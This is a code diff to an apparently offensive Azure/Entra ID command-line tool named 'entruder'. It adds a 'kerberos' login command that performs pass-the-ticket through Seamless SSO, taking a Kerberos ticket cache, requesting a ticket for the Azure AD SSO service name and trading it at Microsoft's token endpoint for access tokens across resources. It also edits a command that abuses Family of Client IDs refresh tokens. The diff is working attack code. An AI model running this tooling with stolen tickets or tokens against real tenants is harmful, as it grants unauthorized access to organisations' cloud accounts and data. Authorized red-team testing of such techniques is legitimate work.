@@ -3,6 +3,7 @@ from rich.console import Console
 from entruder.globals import PLANES, RESOURCE_SHORTCUTS, FOCI_CLIENTS
 from entruder.utils import build_cert_credential, device_login_v1, device_login_v2, parse_error, parse_token, report_error, request_json, resolve_plane_from_resource, save_session, vprint
 import msal
+import os
 
 login_app = typer.Typer(help="Login", no_args_is_help=True)
 console = Console()
@@ -257,13 +258,12 @@ def login_foci(
     resource:      str = typer.Option(None, "-resource", help="Target resource (Optional, default: all planes)"),
     output_tokens: bool = typer.Option(False, "-output", help="Output tokens to console (Optional)"),
 ):
+    """Use the Microsoft Family of Client IDs to acquire a Family Refresh Token (FRT)"""
     try:
         resources = [resource] if resource else list(RESOURCE_SHORTCUTS.keys())
-        family = {}          # client name -> {plane: token} for every accepting client
+        family = {}         
 
         for name, client_id in FOCI_CLIENTS.items():
-            # FOCI redeems the SAME original refresh token as each family member,
-            # independently — never carry a rotated RT across clients
             rt = refresh_token
             client_tokens = {}
 
@@ -308,7 +308,65 @@ def login_foci(
             console.print(f"[bold red][-][/] Not a FOCI refresh token — no family client accepted it")
             raise typer.Exit(1)
 
-        console.print(f"\n[bold]{len(family)}/{len(FOCI_CLIENTS)} FOCI clients accepted the refresh token — sessions saved for tenant: {tenant}[/]")
+        console.print(f"\n[bold]{len(family)}/{len(FOCI_CLIENTS)} FOCI clients accepted the refresh token, sessions saved for tenant: {tenant}[/]")
+
+    except typer.Exit:
+        raise
+    except Exception as e:
+        report_error(e, console)
+        raise typer.Exit(1)
+
+@login_app.command("kerberos")
+def login_kerberos(
+        tenant:        str = typer.Option(...,  "-tenant",  help="Tenant ID"),
+        client_id: str = typer.Option(...,  "-clientid", help="Client ID"),
+        ccache: str = typer.Option(None,  "-ccache", help="The Kerberos ticket cache file needed for authentication (By Default will extract the $KRB5CCNAME environment variable)"),
+        domain: str = typer.Option(...,  "-domain",   help="AD domain (e.g. test.local)"),
+        resource:  str = typer.Option(None, "-resource", help="Target resource (Optional, default: all planes)"),
+        output_tokens: bool = typer.Option(False, "-output", help="Output tokens to console (Optional)"),
+):
+    """Authenticate using Kerberos ticket via Seamless SSO (pass-the-ticket)"""
+    try:
+        # resolve the ccache and assign it to the KRB5CCNAME env variable
+        if ccache:
+            ccache = os.path.realpath(ccache)
+            if not os.path.exists(ccache):
+                console.print(f"[bold red][-][/] ccache file not found: {ccache}")
+                raise typer.Exit(1)
+            os.environ["KRB5CCNAME"]=f"FILE:{ccache}"
+
+        from entruder.utils.kerberos import get_kerberos_service_ticket 
+        spn = f"HTTP/autologon.microsoftazuread-sso.com@{domain.upper()}"
+        service_ticket = get_kerberos_service_ticket(spn)
+
+        resources = [resource] if resource else list(RESOURCE_SHORTCUTS.keys())
+        tokens = {}
+
+        for res in resources:
+            plane = resolve_plane_from_resource(res)
+            resource_url = RESOURCE_SHORTCUTS.get(res, res)
+
+            result = request_json("POST",
+                                  f"https://login.microsoftonline.com/{tenant}/oauth2/token",
+                                  data={
+                                      "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+                                      "client_id":  client_id,
+                                      "resource":   resource_url,
+                                      "assertion":  service_ticket,
+                                      "client_info": 1,
+                                  })
+            if "access_token" not in result:
+                console.print(f"  [red]X[/] {plane} {parse_error(result.get('error_description', ''))}")
+                continue
+            tokens[plane] = parse_token(result)
+            console.print(f"[bold green][+][/] {plane.capitalize()} Token acquired successfully!")
+
+        if tokens:
+            save_session(tenant,client_id, tokens)
+            console.print(f"\n[bold green][+][/] Session saved for tenant: {tenant}")
+        else:
+            console.print(f"\n[bold red][-][/] No tokens acquired")
+            raise typer.Exit(1)
 
     except typer.Exit:
         raise
